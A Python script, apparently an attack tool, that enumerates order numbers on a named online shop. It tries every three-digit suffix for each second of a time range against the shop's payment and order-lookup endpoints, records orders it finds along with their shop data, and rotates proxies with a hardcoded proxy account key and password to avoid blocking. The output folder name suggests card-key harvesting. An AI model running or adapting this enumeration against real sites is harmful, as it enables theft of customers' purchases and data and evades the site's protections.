#!/usr/bin/env python3
"""对已知秒桶做全后缀 000-999 扫描（精确，不采样）"""
import json, os, re, subprocess, sys, time

ENV = "/data/config/proxy.env"
FETCH = "/data/automation/bin/qg-proxy-fetch.sh"
BASE = "https://hmjf.lol/shop"
OUT = os.environ.get("HMJF_OUT", "/data/automation/results/hmjf.lol/kami_mine_20260716")
UA = "Mozilla/5.0"; REF = "https://hmjf.lol/shop/"

def px():
    for l in open(ENV):
        if l.startswith("PROXY_URL="):
            return l.split("=", 1)[1].strip().strip('"')
    return ""

PX = px(); N = 0

def curl(url):
    global N, PX
    N += 1
    if N % 150 == 0:
        subprocess.run(["bash", FETCH], capture_output=True,
                       env={**os.environ, "QG_AUTHKEY": "02E76F93", "QG_AUTHPWD": "A0FFB679553D"})
        PX = px()
    return subprocess.run(
        ["curl", "-s", "--max-time", "8", "-x", PX, "-A", UA, "-H", f"Referer: {REF}", url],
        capture_output=True, text=True, timeout=12,
    ).stdout or ""

def scan_prefix(prefix14):
    hits = []
    for s in range(1000):
        tn = f"{prefix14}{s:03d}"
        sub = curl(f"{BASE}/other/submit.php?type=alipay&orderid={tn}")
        if "window.location" in sub and "不存在" not in sub:
            gs = curl(f"{BASE}/other/getshop.php?trade_no={tn}")
            hits.append({"tn": tn, "gs": gs[:200]})
            print(f"EXIST {tn} {gs[:100]}", flush=True)
        time.sleep(0.03)
    return hits

def scan_range(date, h0, h1):
    all_hits = []
    for h in range(h0, h1):
        for m in range(60):
            for sec in range(60):
                p = f"{date}{h:02d}{m:02d}{sec:02d}"
                hits = scan_prefix(p)
                if hits:
                    all_hits.extend(hits)
                print(f"done {p} hits={len(hits)} total={len(all_hits)}", flush=True)
    json.dump(all_hits, open(f"{OUT}/fullscan_{date}_{h0}-{h1}.json", "w"), ensure_ascii=False, indent=2)

if __name__ == "__main__":
  # usage: paid_full_suffix.py 20260716 2 5
  date, h0, h1 = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
  scan_range(date, h0, h1)
